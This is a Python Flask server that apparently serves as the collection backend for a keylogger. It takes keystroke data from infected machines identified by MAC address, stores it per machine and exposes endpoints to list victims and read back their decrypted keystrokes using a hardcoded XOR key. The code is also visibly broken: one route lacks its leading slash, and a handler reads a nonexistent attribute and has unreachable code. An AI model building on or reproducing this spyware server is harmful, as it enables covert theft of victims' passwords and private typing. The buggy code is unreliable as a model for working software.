import os
from platform import machine

from flask import Flask, request, jsonify
import file_time
import encryptor

EN = encryptor.Encryptor("mysecretkey")

app = Flask(__name__)

@app.route('/api/upload', methods=['POST'])
def upload():
    content = request.json
    machine = content.get("mac_address")
    encrypted_data = content.get("keystrokes")

    if not machine or not encrypted_data:
        return jsonify({"error": "Missing data"}), 400

    print(machine)
    print(encrypted_data)
    print(EN.xor_encrypt(encrypted_data))
    file_time.file_writer(machine, encrypted_data)
    return jsonify({"status": "success"}), 200

@app.route('api/computers',methods=['GET'])
def computers():
    try:
        computers = [{'mac_address': mac_address} for mac_address in os.listdir("data") if os.path.isdir(os.path.join('data', mac_address))]
        return jsonify(computers)
    except Exception as e:
        return jsonify({'error': f'Failed to list machines: {str(e)}'}), 500

@app.route('/api/show_computers', methods=['GET'])
def show():
    id_computer = request.args.get("mac_address")
    date = request.args.get("date")
    if id_computer and date:
        return EN.xor_encrypt(upload.encrypted_data)
        print(EN.xor_encrypt(upload.encrypted_data))

@app.route('/api/add_computers',methods=['POST'])
def add_computer():
    pass

if __name__ == '__main__':
    app.run(port=5000)